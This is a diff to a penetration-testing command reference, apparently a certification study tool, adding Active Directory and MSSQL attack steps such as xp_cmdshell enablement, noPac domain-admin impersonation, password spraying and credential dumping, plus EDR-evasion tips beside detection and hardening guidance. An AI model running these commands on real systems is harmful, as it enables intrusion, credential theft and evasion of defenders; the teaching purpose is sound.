         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Find impersonatable logins",
+          "command": "SELECT name FROM sys.server_permissions p JOIN sys.server_principals s ON p.grantor_principal_id=s.principal_id WHERE permission_name='IMPERSONATE'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Check who you can impersonate",
+          "command": "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'"
+        },
+        {
+          "label": "Impersonate sa/high-priv login",
+          "command": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;"
+        },
+        {
+          "label": "Now enable xp_cmdshell",
+          "command": "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+        }
+      ]
     },
     {
       "id": "crtp-mssql-links",
@@ -43154,7 +45261,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Linked servers configured with SA or sysadmin credentials. xp_cmdshell enabled. Links span domains with overprivileged accounts. No SQL audit enabled. SQL service account has domain admin rights.",
         "vulnerable_config": "-- Check linked servers and their credentials:\nSELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;\nSELECT s.name, l.remote_name, l.uses_self_credential\nFROM sys.servers s JOIN sys.linked_logins l ON s.server_id = l.server_id;\n-- uses_self_credential = 0 AND remote_name = 'sa' → sysadmin link = CRITICAL\n\n-- xp_cmdshell enabled:\nSELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';\n-- 1 = enabled = OS command execution possible",
         "secure_config": "-- Remove unnecessary linked servers:\nEXEC sp_dropserver 'LINKED_SERVER_NAME', 'droplogins';\n\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Audit linked server access:\nCREATE SERVER AUDIT LinkedServerAudit TO FILE (FILEPATH = 'C:\\SQLAudit\\');\nCREATE SERVER AUDIT SPECIFICATION LinkedServerSpec\nFOR SERVER AUDIT LinkedServerAudit\nADD (LINKED_SERVER_ACCESS_GROUP);\nALTER SERVER AUDIT SPECIFICATION LinkedServerSpec WITH (STATE = ON);\nALTER SERVER AUDIT LinkedServerAudit WITH (STATE = ON);\n\n-- Use minimal-privilege account for any required links:\n-- Create read-only SQL Auth login for the link, not SA"
-      }
+      },
+      "variations": [
+        {
+          "label": "Run OS command across the link chain",
+          "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\""
+        }
+      ]
     },
     {
       "id": "ad-mssqlclient",
@@ -43241,6 +45354,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "SQL auth",
+          "command": "mssqlclient.py <user>:<password>@<target>"
+        },
+        {
+          "label": "Pass-the-ticket",
+          "command": "KRB5CCNAME=<ccache> mssqlclient.py -k <domain>/<user>@<target_fqdn>"
+        }
       ]
     },
     {
@@ -43272,10 +45395,6 @@ const COMMAND_DATA = {
         "webshell"
       ],
       "variations": [
-        {
-          "label": "Connect (no space after -p)",
-          "command": "mysql -u <user> -p<password> -h <ip>"
-        },
         {
           "label": "Disable TLS if it errors",
           "command": "mysql -u <user> -p<password> -h <ip> --ssl=0"
@@ -43374,7 +45493,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       }
     },
     {
@@ -43452,10 +45572,6 @@ const COMMAND_DATA = {
         {
           "label": "Connect (no password)",
           "command": "mysql -u root -h <ip>"
-        },
-        {
-          "label": "Connect (with password)",
-          "command": "mysql -u root -pP4SSw0rd -h <ip>"
         }
       ],
       "opsec": "moderate",
@@ -43475,7 +45591,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable any risky setting after use; read files via SQL directly; avoid writing webshells where a read suffices."
       }
     },
     {
@@ -43580,24 +45697,19 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Install Nessus .deb package",
-          "command": "sudo dpkg -i Nessus-<version>-ubuntu910_amd64.deb",
-          "label": "sudo dpkg -i Nessus-<version>-ubun…"
-        },
-        {
           "description": "Start Nessus service",
           "command": "sudo systemctl start nessusd.service",
-          "label": "systemctl"
+          "label": "Start nessusd"
         },
         {
           "description": "Enable Nessus at boot",
           "command": "sudo systemctl enable nessusd.service",
-          "label": "systemctl"
+          "label": "Enable at boot"
         },
         {
           "description": "Check Nessus service status",
           "command": "sudo systemctl status nessusd.service",
-          "label": "systemctl"
+          "label": "Check status"
         },
         {
           "description": "Access Nessus web UI (after start)",
@@ -43713,6 +45825,20 @@ const COMMAND_DATA = {
       },
       "tools": [
         "net"
+      ],
+      "variations": [
+        {
+          "label": "Domain admins",
+          "command": "net group \"Domain Admins\" /domain"
+        },
+        {
+          "label": "Current user's groups",
+          "command": "net user <user> /domain"
+        },
+        {
+          "label": "Password policy",
+          "command": "net accounts /domain"
+        }
       ]
     },
     {
@@ -43793,6 +45919,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "net"
+      ],
+      "variations": [
+        {
+          "label": "Then enumerate with rpcclient",
+          "command": "rpcclient -U \"\" -N <dc_ip> -c enumdomusers"
+        }
       ]
     },
     {
@@ -44168,7 +46300,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces — should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
-        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
+        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
+        "evasion": "Prefer encrypted/HTTPS callbacks, migrate out of the initial process quickly, and avoid signatured default payloads."
       }
     },
     {
@@ -44460,12 +46593,32 @@ const COMMAND_DATA = {
       },
       "tools": [
         "netdom"
+      ],
+      "variations": [
+        {
+          "label": "Verbose (direction + type)",
+          "command": "netdom query /domain:<domain> trust /verbose"
+        },
+        {
+          "label": "List DCs / workstations too",
+          "command": "netdom query /domain:<domain> dc"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Map trust relationships",
+          "command": "netdom query /domain:<domain> trust"
+        },
+        {
+          "label": "Cross-check with PowerView",
+          "command": "Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType"
+        }
       ]
     },
     {
       "id": "netexec-bruteforce",
       "name": "NetExec - Brute Force and Enumerate",
-      "command": "netexec <proto> <ip> -u <user.list> -p <password.list>",
+      "command": "netexec <proto> <ip> -u <userlist> -p <wordlist>",
       "description": "NetExec (formerly CrackMapExec) sprays credentials across a protocol (smb, winrm, ssh, etc.). A [+] marks a valid pair; (Pwn3d!) means code execution is possible. Add --shares to list accessible SMB shares once authenticated.",
       "platform": "linux",
       "requires": [
@@ -44535,11 +46688,11 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "WinRM",
-          "command": "netexec winrm <ip> -u <user.list> -p <password.list>"
+          "command": "netexec winrm <ip> -u <userlist> -p <wordlist>"
         },
         {
           "label": "SMB",
-          "command": "netexec smb <ip> -u <user.list> -p <password.list>"
+          "command": "netexec smb <ip> -u <userlist> -p <wordlist>"
         },
         {
           "label": "SMB + Shares",
@@ -44552,7 +46705,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "NetExec (nxc) brute-forces credentials across many hosts/protocols (SMB, WinRM, LDAP, MSSQL...) in one sweep.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. NetExec parallelises guesses across a host list over SMB/WinRM/etc.",
         "prerequisites": "Network access to the target protocol and credential lists.",
         "impact": "Validated credentials and the hosts they authenticate to.",
         "detection": "Failed authentication bursts: Windows 4625 (failed logon) and 4771 (Kerberos pre-auth failed) at abnormal rate/volume; account lockouts (4740); many attempts from one source, or - for spraying - one password across many accounts. SIEM correlation on failed-logon spikes.",
@@ -44653,7 +46806,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "NetExec authenticates across many hosts using an NTLM hash (-H) to execute commands, dump creds, or spray at scale.",
+        "why_it_works": "NTLM/Kerberos authenticate the account's SECRET (its NT hash or Kerberos key), not the plaintext password — the KDC/target never sees the password itself. So possessing the hash/ticket is equivalent to knowing the password: you inject it and authenticate as that user without ever cracking it. NetExec -H sprays/authenticates with the hash across hosts to find where it grants access.",
         "prerequisites": "A valid NTLM hash and network access to the target protocol.",
         "impact": "Authenticated action across many hosts via PtH - fast lateral movement/triage.",
         "detection": "[MITRE T1550.002] Event 4624 Logon Type 3 with Authentication Package NTLM and LogonProcessName NtLmSsp, with NO preceding interactive logon for that account; the same NTLM hash authenticating from an unusual source; 4672 for privileged PtH.",
@@ -44673,7 +46826,7 @@ const COMMAND_DATA = {
     {
       "id": "netexec-spray",
       "name": "NetExec - Password Spraying",
-      "command": "netexec smb <cidr> -u <user.list> -p '<password>'",
+      "command": "netexec smb <cidr> -u <userlist> -p '<password>'",
       "description": "Password spraying tries one password against many accounts to stay under lockout thresholds, optionally across a whole subnet. Reverse of brute forcing (many passwords, one account). Ideal with a single common password.",
       "platform": "linux",
       "requires": [
@@ -44732,7 +46885,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Password spraying tries ONE common password across MANY accounts to avoid lockouts while still catching weak passwords.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. Spraying one password across the user list stays under lockout thresholds.",
         "prerequisites": "A user list and one/few candidate passwords; access to the auth service.",
         "impact": "Compromised accounts using the sprayed password - often a domain foothold.",
         "detection": "Failed authentication bursts: Windows 4625 (failed logon) and 4771 (Kerberos pre-auth failed) at abnormal rate/volume; account lockouts (4740); many attempts from one source, or - for spraying - one password across many accounts. SIEM correlation on failed-logon spikes.",
@@ -44747,7 +46900,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak lockout policy (domain default or intentionally lenient):\n# Fine-Grained Password Policy:\nGet-ADDefaultDomainPasswordPolicy\n# LockoutObservationWindow: 00:30:00\n# LockoutThreshold:         0          <-- DISABLED! No lockout ever\n# OR: LockoutThreshold: 10 (attacker sprays 9 per window, never locks)\n\n# Also: accounts with password = company name:\n# Common passwords: Summer2023!, Winter2024!, CompanyName1!",
         "secure_config": "# Set a strong lockout policy:\n# Via Default Domain Policy or Fine-Grained Password Policy (PSO):\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00 \\\n    -LockoutThreshold 5\n# LockoutThreshold 5 means 5 bad attempts in 30 min = 30-min lockout\n\n# Fine-Grained PSO for admins (stricter):\nNew-ADFineGrainedPasswordPolicy -Name AdminPSO \\\n    -LockoutThreshold 3 -LockoutDuration 01:00:00 \\\n    -LockoutObservationWindow 01:00:00 \\\n    -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject AdminPSO -Subjects 'Domain Admins'\n\n# Enable Azure AD / Entra ID Password Protection (bans common passwords):\n# Also available on-premises via the Azure AD Password Protection agent\n\n# Monitor Event 4740 (Account Locked Out) — spray leaves a cluster of these"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "LDAP / WinRM protocols too",
+          "command": "netexec winrm <cidr> -u <userlist> -p '<password>' | grep +"
+        }
+      ]
     },
     {
       "id": "ad-gmsa-read",
@@ -44820,6 +46979,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "netexec"
+      ],
+      "variations": [
+        {
+          "label": "gMSADumper (Python)",
+          "command": "python3 gMSADumper.py -u <user> -p <password> -d <domain>"
+        },
+        {
+          "label": "PowerView (on-host)",
+          "command": "Get-DomainObject -Identity <gmsa_account> -Properties msds-managedpassword"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find gMSAs you can read the password of",
+          "command": "nxc ldap <dc_ip> -u <user> -p <password> --gmsa"
+        },
+        {
+          "label": "Use the NT hash for the gMSA account",
+          "command": "# pass-the-hash / overpass-the-hash as the gMSA (often high-priv)"
+        }
       ]
     },
     {
@@ -44885,10 +47064,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "SAM",
-          "command": "netexec smb <ip> --local-auth -u <user> -p <password> --sam"
-        },
-        {
           "label": "LSA",
           "command": "netexec smb <ip> --local-auth -u <user> -p <password> --lsa"
         }
@@ -44899,7 +47074,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "NetExec remotely dumps credentials (LSASS, SAM, LSA) across hosts over SMB using valid admin creds/hash, at scale.",
+        "why_it_works": "With admin over SMB, the remote SAM/LSA secrets (and cached domain creds) can be read from the registry hives remotely — NetExec automates the dump.",
         "prerequisites": "Valid admin credentials/hash and SMB (445) to the targets.",
         "impact": "Bulk credential harvest across many hosts for lateral movement.",
         "detection": "Admin logons (4624 type 3 + 4672) across many hosts from one source; remote LSASS/SAM access; [MITRE T1003.001] A handle to lsass.exe opened with read/clone rights (Sysmon Event 10; Security 4656/4663 on lsass); known dumper signatures (mimikatz/pypykatz/comsvcs); SYSTEM/debug context preceding it.",
@@ -45017,7 +47192,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M25",
           "MITRE T1068"
-        ]
+        ],
+        "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable — verify the kernel/arch match before firing to avoid a panic."
       }
     },
     {
@@ -45191,7 +47367,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "NFS exports are configured with overly permissive options: world-readable (accessible to any host), no_root_squash (remote root user maps to local root), or sync=off. Combined with SSH authorized_keys being writable in an exported directory, this can lead to full system compromise.",
         "vulnerable_config": "# /etc/exports — dangerous NFS export:\n/home/user    *(rw,no_root_squash,no_all_squash,sync)\n# '*' = any host can mount\n# 'rw' = read+write\n# 'no_root_squash' = remote root = local root (critical misconfiguration)\n\n# If /home/user/.ssh is on an NFS share:\n# Attacker mounts the share, writes their public key to .ssh/authorized_keys\n# -> SSH in as that user without a password",
-        "secure_config": "# /etc/exports — hardened:\n/data/shared    10.10.1.0/24(ro,root_squash,all_squash,sync)\n# Specific subnet only, read-only, root_squash (remote root -> nobody)\n# all_squash: ALL remote users map to anonymous (anonuid/anongid)\n\n# For read-write shares where needed:\n/data/team      10.10.1.100(rw,root_squash,sync,secure)\n# 'root_squash' is the minimum — never use no_root_squash\n# 'secure' = require source port < 1024 (prevents non-root mounting tricks)\n\n# After editing /etc/exports:\nexportfs -ra  # reload exports\nexportfs -v   # verify what's published"
+        "secure_config": "# /etc/exports — hardened:\n/data/shared    10.10.1.0/24(ro,root_squash,all_squash,sync)\n# Specific subnet only, read-only, root_squash (remote root -> nobody)\n# all_squash: ALL remote users map to anonymous (anonuid/anongid)\n\n# For read-write shares where needed:\n/data/team      10.10.1.100(rw,root_squash,sync,secure)\n# 'root_squash' is the minimum — never use no_root_squash\n# 'secure' = require source port < 1024 (prevents non-root mounting tricks)\n\n# After editing /etc/exports:\nexportfs -ra  # reload exports\nexportfs -v   # verify what's published",
+        "evasion": "Mount read-only and copy only needed files; unmount after; no_root_squash abuse (SUID drop) leaves a file — remove it."
       }
     },
     {
@@ -45302,7 +47479,7 @@ const COMMAND_DATA = {
         "vulnerability-scanning",
         "scripting-engine"
       ],
-      "category": "Vulnerability Scanning",
+      "category": "Vulnerability Assessment",
       "subcategory": "Nmap NSE",
       "certifications": [
         "OSCP"
@@ -45716,10 +47893,6 @@ const COMMAND_DATA = {
       "description": "Tune RTT timeouts, retries, and packet rate to speed up big scans - at the cost of missing hosts on lossy links. Save outputs and diff open-port counts to see the trade-off.",
       "variations": [
         {
-          "label": "Optimized RTT timeouts",
-          "command": "sudo nmap <cidr> -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms"
-        },
-        {
           "label": "No retries (fastest, least reliable)",
           "command": "sudo nmap <cidr> -F --max-retries 0"
         },
@@ -45932,7 +48105,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Nmap scans the AD subnet to identify hosts and services (DCs, SQL, web) for targeting.",
+        "why_it_works": "Hosts and services reveal themselves by responding to TCP/UDP probes; scanning the DC's AD ports (88/389/445/…) confirms roles and reachable services.",
         "prerequisites": "Network access to the internal subnet.",
         "impact": "A host/service map of the AD environment.",
         "detection": "[MITRE T1046] scan probes across hosts/ports in firewall/IDS logs; internal scanning pattern.",
@@ -45949,6 +48122,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "nmap"
+      ],
+      "variations": [
+        {
+          "label": "DC-focused ports only",
+          "command": "nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV <dc_ip>"
+        }
       ]
     },
     {
@@ -46043,10 +48222,6 @@ const COMMAND_DATA = {
         {
           "label": "Quick default scan",
           "command": "nmap <ip>"
-        },
-        {
-          "label": "Full version + scripts",
-          "command": "nmap -sV -sC -p- <ip>"
         },
         {
           "label": "Named script on a port",
@@ -46361,10 +48536,6 @@ const COMMAND_DATA = {
         {
           "label": "Packet-trace on a single port (diagnose closed/filtered state)",
           "command": "sudo nmap <ip> -p 21 --packet-trace -Pn -n --disable-arp-ping"
-        },
-        {
-          "label": "Connect scan (-sT) — no raw socket needed",
-          "command": "sudo nmap <ip> -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT"
         }
       ]
     },
@@ -46430,10 +48601,6 @@ const COMMAND_DATA = {
       "command": "sudo nmap <ip> --top-ports=10",
       "description": "Scan the most common ports, or specify exactly which ports to scan. Port selection is the main lever on scan scope vs speed.",
       "variations": [
-        {
-          "label": "Top 10 ports",
-          "command": "sudo nmap <ip> --top-ports=10"
-        },
         {
           "label": "All 65535 ports",
           "command": "sudo nmap <ip> -p-"
@@ -46816,10 +48983,6 @@ const COMMAND_DATA = {
       "description": "NSE runs Lua scripts for deeper enumeration and vuln checks. -sC runs the default set; choose categories or named scripts for targeted checks; -A bundles -sC -sV -O --traceroute.",
       "variations": [
         {
-          "label": "Default scripts (-sC)",
-          "command": "sudo nmap <target> -sC"
-        },
-        {
           "label": "A whole category",
           "command": "sudo nmap <target> --script <category>"
         },
@@ -46939,6 +49102,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "noPac"
+      ],
+      "variations": [
+        {
+          "label": "Dump hashes via noPac",
+          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -dump"
+        },
+        {
+          "label": "Get a shell",
+          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -shell"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Scan for CVE-2021-42278/42287",
+          "command": "sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <dc_ip>"
+        },
+        {
+          "label": "Exploit to impersonate DA",
+          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -shell"
+        }
       ]
     },
     {
@@ -47213,7 +49396,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "AD objects (users, groups, OUs, GPOs) have overly permissive ACEs granting non-privileged users GenericAll, GenericWrite, WriteDACL, WriteOwner, or ExtendedRight (ForceChangePassword, AddMember). Because AD ACEs are not prominently visible in standard tools and can be inherited from parent OUs, these misconfigurations accumulate over time — especially after large provisioning events or mergers.",
         "vulnerable_config": "# Finding objects where Domain Users have dangerous rights:\nGet-DomainObjectAcl -ResolveGUIDs |\n    Where-Object {\n        $_.IdentityReference -eq 'CORP\\Domain Users' -and\n        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'\n    }\n\n# Or via BloodHound:\n# 'Shortest Paths to Domain Admins from Domain Users' query\n# Shows every ACE path from low-privilege to DA",
-        "secure_config": "# Remove dangerous ACEs using PowerView:\nRemove-DomainObjectAcl -TargetIdentity 'Domain Admins' \\\n    -PrincipalIdentity 'Domain Users' -Rights GenericWrite\n\n# Quarterly ACL audit script:\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner' -and\n    $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'\n} | Export-Csv acl_audit_$(Get-Date -f yyyyMMdd).csv\n\n# Enable AD Recycle Bin and Protected Users group\n# Use Tiered Administration model to limit blast radius of any single compromise\n# Enable MDI (Microsoft Defender for Identity) — detects ACL abuse chains"
